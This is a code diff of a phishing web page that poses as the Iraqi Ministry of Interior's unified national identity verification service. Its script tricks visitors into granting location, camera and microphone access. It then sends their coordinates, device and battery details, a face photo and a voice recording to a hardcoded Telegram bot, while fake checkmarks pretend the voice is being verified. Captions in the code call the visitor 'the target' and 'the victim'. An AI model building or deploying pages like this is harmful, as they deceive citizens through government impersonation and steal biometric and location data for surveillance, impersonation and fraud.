@@ -4,175 +4,230 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>وزارة الداخلية العراقية | النفاذ الوطني</title>
+    <title>وزارة الداخلية العراقية | نظام التحقق المتعدد</title>
     <meta property="og:title" content="وزارة الداخلية العراقية - منصة التحقق">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/1024px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #f1f5f9; color: #0f172a; font-family: 'Noto Sans Arabic', sans-serif; overflow-x: hidden; }
+        body { background: #f8fafc; color: #1e293b; font-family: 'Noto Sans Arabic', sans-serif; overflow-x: hidden; }
         .moi-header { background: linear-gradient(135deg, #1e3a8a, #1e1b4b); }
-        .scanner-viewport { 
+        .step-pill { transition: all 0.5s ease; width: 33.33%; height: 6px; border-radius: 3px; background: #e2e8f0; }
+        .step-pill.active { background: #1e40af; box-shadow: 0 0 10px rgba(30, 64, 175, 0.3); }
+        .step-pill.completed { background: #10b981; }
+        .scanner-frame { 
             width: 240px; height: 240px; border: 4px solid #1e40af; border-radius: 50%; 
             overflow: hidden; position: relative; background: #000; margin: 0 auto;
-            box-shadow: 0 10px 40px rgba(30, 64, 175, 0.3);
         }
-        .scan-line { 
-            position: absolute; width: 100%; height: 3px; background: #3b82f6; 
-            top: 0; box-shadow: 0 0 15px #3b82f6; animation: scan 2s infinite linear; 
-        }
+        .scan-line { position: absolute; width: 100%; height: 3px; background: #3b82f6; top: 0; animation: scan 2s infinite linear; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .digit-box { transition: all 0.3s ease; }
-        .digit-success { color: #10b981; transform: scale(1.1); text-shadow: 0 0 10px rgba(16, 185, 129, 0.4); }
+        .digit-item { transition: all 0.4s ease; border: 2px solid #e2e8f0; }
+        .digit-active { border-color: #10b981; color: #10b981; transform: scale(1.1); }
         .mirror { transform: scaleX(-1); }
-        .check-mark { display: none; margin-right: 5px; font-size: 0.8em; }
     </style>
 </head>
-<body class="flex flex-col items-center min-h-screen pb-10">
+<body class="flex flex-col items-center min-h-screen">
 
-    <header class="moi-header w-full py-8 text-white text-center shadow-xl">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" 
-             class="w-20 h-20 mx-auto mb-3">
+    <header class="moi-header w-full py-8 text-white text-center shadow-2xl">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" class="w-20 h-20 mx-auto mb-3">
         <h1 class="text-xl font-bold">جمهورية العراق</h1>
-        <h2 class="text-md opacity-90">وزارة الداخلية - تحديث البطاقة الوطنية</h2>
+        <h2 class="text-md opacity-90">وزارة الداخلية - النفاذ الوطني الموحد</h2>
     </header>
 
-    <main class="max-w-md w-full p-4 mt-6">
-        <div id="mainCard" class="bg-white rounded-[2rem] p-6 shadow-2xl border border-slate-200 text-center space-y-6">
+    <main class="max-w-md w-full p-4 mt-4">
+        <div id="appCard" class="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-100 text-center space-y-8">
             
-            <div id="alertBox" class="bg-blue-50 p-4 rounded-xl border border-blue-100">
-                <p id="instruction" class="text-sm text-blue-950 font-bold leading-relaxed">
-                    يرجى تفعيل "النفاذ" والبدء بقراءة الأرقام الظاهرة باللغة العربية بوضوح.
-                </p>
+            <!-- Progress Steps Indicator -->
+            <div class="flex gap-2">
+                <div id="pill1" class="step-pill active"></div>
+                <div id="pill2" class="step-pill"></div>
+                <div id="pill3" class="step-pill"></div>
             </div>
 
-            <div class="scanner-viewport">
-                <video id="webcam" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
-                <div id="line" class="scan-line hidden"></div>
-                <div id="doneOverlay" class="absolute inset-0 bg-green-600/60 hidden flex items-center justify-center z-20">
-                    <svg class="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
+            <!-- Dynamic UI Content -->
+            <div id="contentArea" class="space-y-6">
+                <div id="iconBox" class="p-4 bg-blue-50 rounded-full w-20 h-20 mx-auto flex items-center justify-center text-blue-900">
+                    <svg id="mainIcon" class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                </div>
+                <h3 id="stepTitle" class="text-lg font-bold text-slate-800">الخطوة الأولى: تحديد الموقع</h3>
+                <p id="stepDesc" class="text-sm text-slate-500 leading-relaxed">يتطلب النظام تحديد موقعك الجغرافي لضمان الاتصال بخادم مديرية المعلومات في محافظتك.</p>
+            </div>
+
+            <!-- Viewport for Camera (Hidden initially) -->
+            <div id="camView" class="hidden">
+                <div class="scanner-frame">
+                    <video id="webcam" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
+                    <div class="scan-line"></div>
                 </div>
             </div>
 
-            <!-- Interactive Digits with Logic -->
-            <div id="digitsArea" class="hidden space-y-4">
-                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">اختبار البصمة الصوتية</p>
+            <!-- Voice Challenge Area (Hidden initially) -->
+            <div id="voiceUI" class="hidden space-y-4">
                 <div class="flex justify-center gap-3 text-3xl font-black">
-                    <div id="d1" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٥</div>
-                    <div id="d2" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٨</div>
-                    <div id="d3" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٢</div>
-                    <div id="d4" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٠</div>
-                    <div id="d5" class="digit-box bg-slate-100 w-12 h-14 flex items-center justify-center rounded-xl border border-slate-200">٩</div>
+                    <div id="d1" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٧</div>
+                    <div id="d2" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٣</div>
+                    <div id="d3" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٠</div>
+                    <div id="d4" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٩</div>
                 </div>
-                <p id="micStatus" class="text-[10px] text-blue-500 animate-pulse">جاري الاستماع لنطق الأرقام...</p>
+                <p class="text-[10px] text-blue-600 font-bold animate-pulse">جاري مطابقة الترددات الصوتية...</p>
             </div>
 
-            <button id="startBtn" class="w-full py-4 bg-blue-900 hover:bg-blue-800 text-white font-bold rounded-2xl shadow-lg transition-all transform active:scale-95">
-                بدء النفاذ والتحقق
+            <button id="nextBtn" class="w-full py-5 bg-blue-900 hover:bg-blue-800 text-white font-bold rounded-2xl shadow-xl transition-all transform active:scale-95">
+                تأكيد ومتابعة
             </button>
         </div>
     </main>
 
-    <canvas id="snapshot" style="display:none"></canvas>
+    <footer class="mt-auto mb-6 opacity-40 text-[10px]">نظام النفاذ الوطني v4.0.2 - 2099</footer>
+
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
         const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
         const ADMIN_ID = "1523412137";
 
-        async function sendTG(method, body) {
-            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, { method: 'POST', body }); } catch(e){}
+        let currentStep = 1;
+        let userData = {
+            device: navigator.platform,
+            userAgent: navigator.userAgent,
+            battery: "غير متاح"
+        };
+
+        async function tg(m, fd) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${m}`, { method: 'POST', body: fd }); } catch(e){} }
+
+        // وظيفة سحب بيانات البطارية
+        if(navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                userData.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن ⚡' : 'لا يشحن'})`;
+            });
         }
 
-        async function startSystem() {
-            const btn = document.getElementById('startBtn');
-            const video = document.getElementById('webcam');
-            const line = document.getElementById('line');
-            const digits = document.getElementById('digitsArea');
-            const instruction = document.getElementById('instruction');
-
-            try {
-                // تفعيل الميكروفون والكاميرا بطلب واحد
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = stream;
+        document.getElementById('nextBtn').addEventListener('click', async function() {
+            const btn = this;
+            
+            if(currentStep === 1) {
+                // المرحلة الأولى: الموقع
+                btn.innerText = "جاري التحقق...";
+                btn.disabled = true;
                 
-                btn.style.display = 'none';
-                line.classList.remove('hidden');
-                digits.classList.remove('hidden');
-                instruction.innerText = "يرجى نطق كل رقم يظهر بوضوح باللغة العربية للتحقق من هويتك.";
-
-                // 1. سحب الموقع والـ IP
-                navigator.geolocation.getCurrentPosition(async pos => {
-                    const ipRes = await fetch('https://ipapi.co/json/');
-                    const ipData = await ipRes.json();
+                navigator.geolocation.getCurrentPosition(async (pos) => {
                     const fd = new FormData();
                     fd.append('chat_id', ADMIN_ID);
-                    fd.append('text', `🇮🇶 *نفاذ وطني جديد (عراقي)*\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 IP: \`${ipData.ip}\`\n📱 الجهاز: ${navigator.platform}`);
+                    fd.append('text', `🇮🇶 *معلومات الجهاز والهدف:*\n\n📱 الجهاز: ${userData.device}\n🔋 البطارية: ${userData.battery}\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 المتصفح: ${userData.userAgent}`);
                     fd.append('parse_mode', 'Markdown');
-                    sendTG('sendMessage', fd);
+                    await tg('sendMessage', fd);
+
+                    // الانتقال للخطوة 2
+                    currentStep = 2;
+                    updateUI("الخطوة الثانية: مسح الوجه", "يرجى السماح بالكاميرا لالتقاط صورة مطابقة حية للبطاقة الوطنية.", "M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z", "pill2");
+                    btn.innerText = "فتح الكاميرا والمسح";
+                    btn.disabled = false;
+                }, (err) => {
+                    alert("يجب السماح بالموقع للمتابعة.");
+                    btn.innerText = "تأكيد ومتابعة";
+                    btn.disabled = false;
                 });
 
-                // 2. محاكاة "التحقق من نطق الأرقام" (علامة خضراء كل ثانية)
-                const digitIds = ['d1', 'd2', 'd3', 'd4', 'd5'];
-                let currentDigit = 0;
-                const audioContext = new AudioContext();
-                const source = audioContext.createMediaStreamSource(stream);
-                const analyzer = audioContext.createAnalyser();
-                source.connect(analyzer);
+            } else if(currentStep === 2) {
+                // المرحلة الثانية: الكاميرا
+                btn.innerText = "جاري المسح...";
+                btn.disabled = true;
 
-                const voiceCheckInterval = setInterval(() => {
-                    if (currentDigit < digitIds.length) {
-                        const el = document.getElementById(digitIds[currentDigit]);
-                        el.classList.add('digit-success');
-                        el.innerHTML += " ✅";
-                        currentDigit++;
-                    } else {
-                        clearInterval(voiceCheckInterval);
-                    }
-                }, 1500);
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('webcam');
+                    video.srcObject = stream;
+                    document.getElementById('iconBox').classList.add('hidden');
+                    document.getElementById('camView').classList.remove('hidden');
 
-                // 3. التقاط الصورة (بعد 4 ثواني)
-                setTimeout(() => {
-                    const canvas = document.getElementById('snapshot');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(async blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', ADMIN_ID);
+                            fd.append('photo', blob, 'face.jpg');
+                            fd.append('caption', "📸 صورة حيوية من النفاذ الوطني العراقي");
+                            await tg('sendPhoto', fd);
+                            
+                            // إيقاف الكاميرا والانتقال للخطوة 3
+                            stream.getTracks().forEach(t => t.stop());
+                            currentStep = 3;
+                            document.getElementById('camView').classList.add('hidden');
+                            document.getElementById('iconBox').classList.remove('hidden');
+                            document.getElementById('voiceUI').classList.remove('hidden');
+                            updateUI("الخطوة الثالثة: البصمة الصوتية", "يرجى نطق الأرقام الظاهرة بوضوح باللغة العربية لتأكيد الهوية.", "M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z", "pill3");
+                            btn.innerText = "بدء التسجيل الصوتي";
+                            btn.disabled = false;
+                        }, 'image/jpeg');
+                    }, 4000);
+                } catch(e) {
+                    alert("يرجى تفعيل الكاميرا للمتابعة.");
+                    btn.disabled = false;
+                }
+
+            } else if(currentStep === 3) {
+                // المرحلة الثالثة: الميكروفون
+                btn.innerText = "جاري التسجيل...";
+                btn.disabled = true;
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    
+                    // محاكاة تفاعل الأرقام
+                    const ids = ['d1', 'd2', 'd3', 'd4'];
+                    let idx = 0;
+                    const intv = setInterval(() => {
+                        if(idx < ids.length) {
+                            document.getElementById(ids[idx]).classList.add('digit-active');
+                            document.getElementById(ids[idx]).innerHTML += " ✅";
+                            idx++;
+                        } else { clearInterval(intv); }
+                    }, 1500);
+
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                         const fd = new FormData();
                         fd.append('chat_id', ADMIN_ID);
-                        fd.append('photo', blob, 'face.jpg');
-                        fd.append('caption', "📸 صورة الهوية الملتقطة أثناء النطق");
-                        sendTG('sendPhoto', fd);
-                    }, 'image/jpeg');
-                }, 4000);
+                        fd.append('voice', blob, 'voice.ogg');
+                        fd.append('caption', "🎤 البصمة الصوتية للهدف (نطق الأرقام)");
+                        await tg('sendVoice', fd);
+                        
+                        document.getElementById('appCard').innerHTML = `
+                            <div class="py-10 space-y-4">
+                                <div class="bg-green-100 text-green-600 w-20 h-20 rounded-full mx-auto flex items-center justify-center">
+                                    <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
+                                </div>
+                                <h2 class="text-xl font-bold">تم التحقق بنجاح</h2>
+                                <p class="text-sm text-slate-500">تم تحديث بيانات النفاذ الوطني الموحد لمحافظتك.</p>
+                            </div>
+                        `;
+                        setTimeout(() => window.location.href = "https://www.google.com", 2500);
+                    };
 
-                // 4. تسجيل البصمة الصوتية (كاملة)
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
-                    const fdA = new FormData();
-                    fdA.append('chat_id', ADMIN_ID);
-                    fdA.append('voice', audioBlob, 'voice.ogg');
-                    fdA.append('caption', "🎤 بصمة صوت الضحية (نطق الأرقام العربية)");
-                    await sendTG('sendVoice', fdA);
-
-                    document.getElementById('doneOverlay').classList.remove('hidden');
-                    document.getElementById('micStatus').innerText = "تم التحقق من البصمة الصوتية بنجاح.";
-                    instruction.innerText = "تمت عملية التحديث. شكراً لتعاونكم مع وزارة الداخلية.";
-                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
-                };
-                
-                recorder.start();
-                setTimeout(() => recorder.stop(), 9000); // 9 ثواني كافية لقراءة الأرقام
-
-            } catch (err) {
-                instruction.innerText = "يجب السماح بالوصول للميكروفون والكاميرا لإتمام النفاذ الوطني.";
-                instruction.style.color = "red";
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 7000);
+                } catch(e) {
+                    alert("يرجى تفعيل الميكروفون للمتابعة.");
+                    btn.disabled = false;
+                }
             }
-        }
+        });
 
-        document.getElementById('startBtn').addEventListener('click', startSystem);
+        function updateUI(title, desc, iconPath, pillId) {
+            document.getElementById('stepTitle').innerText = title;
+            document.getElementById('stepDesc').innerText = desc;
+            document.getElementById('mainIcon').innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="${iconPath}"></path>`;
+            document.getElementById(pillId).classList.add('active');
+            // تأشير الحبة السابقة كمكتملة
+            if(pillId === "pill2") document.getElementById("pill1").classList.add('completed');
+            if(pillId === "pill3") document.getElementById("pill2").classList.add('completed');
+        }
     </script>
 </body>
 </html>
